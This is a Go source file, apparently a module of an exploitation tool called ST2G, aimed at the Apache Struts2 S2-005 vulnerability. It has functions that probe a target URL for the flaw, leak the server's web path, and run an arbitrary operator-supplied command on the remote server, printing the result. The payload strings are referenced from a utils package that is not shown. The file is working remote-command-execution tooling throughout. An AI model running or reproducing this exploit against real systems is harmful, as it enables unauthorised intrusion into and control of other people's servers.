package s005

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

func Check(targetUrl string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS005Check)
	if utils.IfContainsStr(respString, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-005！"))
	} else {
		log.Printf("%s Struts2-005 Not Vulnerable.", utils.Green(targetUrl))
	}
}
func GetWebPath(targetUrl string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS005WebPath)
	log.Println(utils.Green(respString))
}

func ExecCommand(targetUrl string, command string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS005Exec(command))
	tmpResult := strings.Replace(url.QueryEscape(respString), "%00", "", -1)
	fmt.Println(url.QueryUnescape(tmpResult))
}
